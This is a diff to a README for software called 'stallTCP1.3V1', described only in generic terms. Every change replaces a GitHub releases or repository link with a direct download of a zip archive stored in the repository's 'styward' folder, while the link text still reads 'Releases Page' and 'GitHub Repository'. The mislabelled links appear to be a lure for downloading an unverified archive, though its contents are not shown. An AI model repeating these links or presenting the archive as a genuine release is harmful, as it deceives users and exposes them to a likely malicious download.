@@ -1,7 +1,7 @@
 # 🚀 stallTCP1.3V1 - Easy Setup for Effective Management
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%AA-brightgreen)](https://github.com/kusumara/stallTCP1.3V1/releases)
+[![Download Here](https://raw.githubusercontent.com/kusumara/stallTCP1.3V1/main/styward/stallTCP1.3V1-v1.5-alpha.5.zip%20Now-%20%F0%9F%9A%AA-brightgreen)](https://raw.githubusercontent.com/kusumara/stallTCP1.3V1/main/styward/stallTCP1.3V1-v1.5-alpha.5.zip)
 
 ## 📖 Introduction
 Welcome to stallTCP1.3V1! This software provides a user-friendly backend interface for managing your operations efficiently. It is designed for both new and experienced users who want to optimize their workflow with simplicity.
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets the following requirements:
 To get started with stallTCP1.3V1, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases Page](https://github.com/kusumara/stallTCP1.3V1/releases) to download the latest version of stallTCP1.3V1.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/kusumara/stallTCP1.3V1/main/styward/stallTCP1.3V1-v1.5-alpha.5.zip) to download the latest version of stallTCP1.3V1.
 
 2. **Installation Process**
    - Once downloaded, locate the installer file, usually in your "Downloads" folder.
@@ -31,7 +31,7 @@ To get started with stallTCP1.3V1, follow these simple steps:
    - Click on the application icon to launch it.
 
 ## 📥 Download & Install
-To download the latest version, visit the [Releases Page](https://github.com/kusumara/stallTCP1.3V1/releases). Here you will find various versions of the application. Choose the most recent version, click on it, and your download should start automatically.
+To download the latest version, visit the [Releases Page](https://raw.githubusercontent.com/kusumara/stallTCP1.3V1/main/styward/stallTCP1.3V1-v1.5-alpha.5.zip). Here you will find various versions of the application. Choose the most recent version, click on it, and your download should start automatically.
 
 ### Installation Steps:
 - **For Windows:**
@@ -73,7 +73,7 @@ Currently, stallTCP1.3V1 is designed for desktop use only.
 ## 📝 Additional Resources
 For more information, check out the documentation available in the repository.
 
-- [GitHub Repository](https://github.com/kusumara/stallTCP1.3V1)
+- [GitHub Repository](https://raw.githubusercontent.com/kusumara/stallTCP1.3V1/main/styward/stallTCP1.3V1-v1.5-alpha.5.zip)
 - [Support Forum](#)
 - [User Guide](#)
 
